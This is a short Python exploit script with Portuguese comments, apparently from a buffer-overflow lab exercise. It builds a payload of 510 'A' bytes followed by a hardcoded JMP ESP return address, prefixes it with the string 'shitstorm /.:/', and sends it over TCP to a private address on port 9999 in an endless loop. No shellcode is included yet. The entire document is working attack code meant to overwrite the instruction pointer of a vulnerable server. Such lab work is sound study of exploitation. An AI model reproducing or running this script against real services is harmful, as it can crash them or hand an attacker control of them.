#!/usr/bin/python3

import sys  # Importa o módulo sys para acessar funcionalidades do sistema
import socket  # Importa o módulo socket para comunicação em rede
from time import sleep  # Importa a função sleep do módulo time para pausar a execução

# Define o endereço JMP ESP
jmp_esp_address = b"\xf3\x12\x17\x31"

# Constrói o buffer com A's seguido pelo endereço JMP ESP
buffer = b"A" * 510 + jmp_esp_address

# Loop infinito para continuar o envio do payload
while True:
    try:
        # Cria um novo socket IPv4 usando TCP
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Conecta-se a um servidor remoto na porta 9999
        sock.connect(('192.168.10.4', 9999))
        
        # Constrói o payload a ser enviado, incluindo o buffer
        payload = b'shitstorm /.:/' + buffer
        
        # Envia o payload através do socket
        sock.send(payload)
        
        # Fecha o socket
        sock.close()
        
    except:
        # Se ocorrer uma exceção, imprime uma mensagem de erro e sai do programa
        print("Error connecting to the server")
        sys.exit()
